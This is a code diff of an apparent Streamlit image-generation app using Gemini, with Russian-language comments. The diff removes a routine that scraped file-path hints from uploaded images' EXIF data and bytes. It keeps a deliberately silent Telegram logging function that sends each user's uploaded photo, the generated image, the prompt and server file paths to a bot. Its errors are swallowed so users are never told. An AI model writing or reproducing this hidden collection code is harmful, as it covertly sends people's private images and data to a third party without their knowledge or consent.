@@ -10,8 +10,6 @@ from telegram import Bot
 from telegram.error import TelegramError
 from telegram import InputMediaPhoto
 import asyncio
-import uuid
-import re
 
 # Page configuration
 st.set_page_config(
@@ -40,114 +38,30 @@ def get_gemini_client():
         st.stop()
     return genai.Client(api_key=api_key)
 
-# Function to extract metadata hints (best-effort)
-def extract_metadata_hints(file_bytes, file_path):
-    """
-    Извлекает подсказки о путях из метаданных изображения (best-effort).
-    Возвращает список найденных строк, похожих на Windows-пути.
-    """
-    hints = []
-    
-    try:
-        # Попытка извлечь EXIF данные
-        img = PILImage.open(io.BytesIO(file_bytes))
-        
-        # Получаем EXIF данные
-        exif_data = img.getexif()
-        if exif_data:
-            # Собираем все строковые значения из EXIF
-            for tag_id, value in exif_data.items():
-                try:
-                    if isinstance(value, str):
-                        # Ищем Windows-пути в строковых значениях EXIF
-                        # Паттерн для дисков: X:\... или X:/...
-                        drive_pattern = r'[A-Za-z]:[\\/][^\\/:*?"<>|\r\n]{0,200}'
-                        # Паттерн для UNC: \\server\share\...
-                        unc_pattern = r'\\\\[^\\/:*?"<>|\r\n]{1,200}(?:\\[^\\/:*?"<>|\r\n]{0,200}){0,10}'
-                        
-                        matches = re.findall(drive_pattern, value)
-                        hints.extend(matches)
-                        matches = re.findall(unc_pattern, value)
-                        hints.extend(matches)
-                except Exception:
-                    continue
-        
-        # Дополнительно: поиск в сырых байтах (ограниченный)
-        # Ищем ASCII-строки, похожие на Windows-пути
-        try:
-            # Конвертируем байты в строку для поиска (только ASCII)
-            text_content = file_bytes[:min(50000, len(file_bytes))].decode('ascii', errors='ignore')
-            
-            # Паттерн для дисков: X:\... или X:/...
-            drive_pattern = r'[A-Za-z]:[\\/][^\\/:*?"<>|\r\n]{10,200}'
-            # Паттерн для UNC: \\server\share\...
-            unc_pattern = r'\\\\[^\\/:*?"<>|\r\n]{1,50}(?:\\[^\\/:*?"<>|\r\n]{1,50}){1,10}'
-            
-            matches = re.findall(drive_pattern, text_content)
-            hints.extend(matches)
-            matches = re.findall(unc_pattern, text_content)
-            hints.extend(matches)
-        except Exception:
-            pass
-            
-    except Exception:
-        # Если не удалось обработать как изображение, игнорируем
-        pass
-    
-    # Дедупликация и ограничение длины
-    unique_hints = []
-    seen = set()
-    for hint in hints:
-        # Нормализуем путь для сравнения
-        normalized = hint.replace('/', '\\').lower()
-        if normalized not in seen and len(hint) <= 300:
-            seen.add(normalized)
-            unique_hints.append(hint)
-            # Ограничиваем количество найденных подсказок
-            if len(unique_hints) >= 5:
-                break
-    
-    return unique_hints
-
-# Function to save uploaded file and return metadata
+# Function to save uploaded file and return full path
 def save_uploaded_file(uploaded_file):
     """
-    Сохраняет загруженный файл во временную директорию и возвращает метаданные файла.
-    Возвращает словарь с ключами: original_name, server_abs_path, metadata_hints
+    Сохраняет загруженный файл во временную директорию и возвращает полный путь к файлу.
     """
     # Создаем директорию temp_uploads в корне проекта, если не существует
     temp_dir = os.path.join(os.path.dirname(__file__), "temp_uploads")
     os.makedirs(temp_dir, exist_ok=True)
     
-    # Делаем имя файла уникальным, чтобы не перезаписывать
-    original_name = uploaded_file.name
-    name_base, ext = os.path.splitext(original_name)
-    unique_name = f"{name_base}_{uuid.uuid4().hex[:8]}{ext}"
-    file_path = os.path.join(temp_dir, unique_name)
-    
-    # Читаем содержимое файла
-    uploaded_file.seek(0)
-    file_bytes = uploaded_file.read()
+    # Сохраняем файл с оригинальным именем
+    file_path = os.path.join(temp_dir, uploaded_file.name)
     
     # Записываем содержимое файла
     with open(file_path, "wb") as f:
-        f.write(file_bytes)
+        uploaded_file.seek(0)  # Сбрасываем указатель файла
+        f.write(uploaded_file.read())
     
-    # Извлекаем метаданные (best-effort)
-    metadata_hints = extract_metadata_hints(file_bytes, file_path)
-    
-    # Возвращаем структуру с метаданными
-    return {
-        'original_name': original_name,
-        'server_abs_path': os.path.abspath(file_path),
-        'metadata_hints': metadata_hints
-    }
+    # Возвращаем полный абсолютный путь
+    return os.path.abspath(file_path)
 
 # Telegram logging function (silent - no UI messages)
-async def _send_telegram_log_async(original_image_bytes, generated_image_bytes, prompt_text, file_metadata_list=None):
+async def _send_telegram_log_async(original_image_bytes, generated_image_bytes, prompt_text, file_paths=None):
     """
     Асинхронная функция для отправки логов в Telegram.
-    file_metadata_list: список словарей с ключами original_name, server_abs_path, metadata_hints
     """
     bot_token = os.getenv("TELEGRAM_BOT_TOKEN")
     if not bot_token:
@@ -159,21 +73,12 @@ async def _send_telegram_log_async(original_image_bytes, generated_image_bytes, 
     # Подготовка медиа-группы
     media_group = []
     
-    # Формируем подпись для оригинального изображения с метаданными файлов
+    # Формируем подпись для оригинального изображения с путями к файлам
     original_caption = "Исходное изображение"
-    if file_metadata_list and len(file_metadata_list) > 0:
-        for idx, metadata in enumerate(file_metadata_list):
-            if idx > 0:
-                original_caption += "\n"
-            original_caption += f"\nФайл {idx + 1}: {metadata.get('original_name', 'unknown')}"
-            original_caption += f"\nСерверный путь: {metadata.get('server_abs_path', 'N/A')}"
-            
-            # Добавляем подсказки из метаданных, если есть
-            hints = metadata.get('metadata_hints', [])
-            if hints:
-                original_caption += "\nПодсказки из метаданных (best-effort, не гарантируется):"
-                for hint in hints[:3]:  # Ограничиваем до 3 подсказок
-                    original_caption += f"\n  • {hint}"
+    if file_paths and len(file_paths) > 0:
+        original_caption += "\nПуть:"
+        for file_path in file_paths:
+            original_caption += f"\n{file_path}"
     
     # Добавляем оригинальное изображение, если есть
     if original_image_bytes:
@@ -199,15 +104,14 @@ async def _send_telegram_log_async(original_image_bytes, generated_image_bytes, 
             caption=f"Промпт:\n{prompt_text}"
         )
 
-def send_telegram_log(original_image_bytes, generated_image_bytes, prompt_text, file_metadata_list=None):
+def send_telegram_log(original_image_bytes, generated_image_bytes, prompt_text, file_paths=None):
     """
     Отправляет логи в Telegram: исходное фото, обработанное фото и промпт.
     Все ошибки обрабатываются молча - пользователь не видит никаких сообщений.
-    file_metadata_list: список словарей с ключами original_name, server_abs_path, metadata_hints
     """
     try:
         # Используем asyncio для вызова асинхронной функции
-        asyncio.run(_send_telegram_log_async(original_image_bytes, generated_image_bytes, prompt_text, file_metadata_list))
+        asyncio.run(_send_telegram_log_async(original_image_bytes, generated_image_bytes, prompt_text, file_paths))
     except TelegramError:
         # Тихо игнорируем ошибки Telegram
         pass
@@ -349,7 +253,7 @@ if generate_button:
         
         # Prepare file parts
         file_parts = []
-        saved_file_metadata = []  # Список метаданных сохраненных файлов
+        saved_file_paths = []  # Список путей к сохраненным файлам
         
         if uploaded_files and len(uploaded_files) > 0:
             num_files = len(uploaded_files)
@@ -357,10 +261,10 @@ if generate_button:
                 status_text.text(f"📤 Завантаження зображення {idx + 1} з {num_files}...")
                 progress_bar.progress(10 + int(20 * (idx + 1) / num_files))
                 
-                # Сохраняем файл на диск и получаем метаданные
+                # Сохраняем файл на диск и получаем полный путь
                 try:
-                    file_metadata = save_uploaded_file(uploaded_file)
-                    saved_file_metadata.append(file_metadata)
+                    file_path = save_uploaded_file(uploaded_file)
+                    saved_file_paths.append(file_path)
                 except Exception:
                     # Тихо игнорируем ошибки сохранения, продолжаем работу
                     pass
@@ -474,8 +378,8 @@ if generate_button:
                     original_image_bytes = uploaded_files[0].read()
                 
                 # Вызываем функцию логирования (все ошибки обрабатываются внутри функции)
-                # Передаем метаданные сохраненных файлов
-                send_telegram_log(original_image_bytes, image_bytes, prompt, saved_file_metadata if saved_file_metadata else None)
+                # Передаем пути к сохраненным файлам
+                send_telegram_log(original_image_bytes, image_bytes, prompt, saved_file_paths if saved_file_paths else None)
             except Exception:
                 # Тихо игнорируем любые ошибки при логировании
                 pass
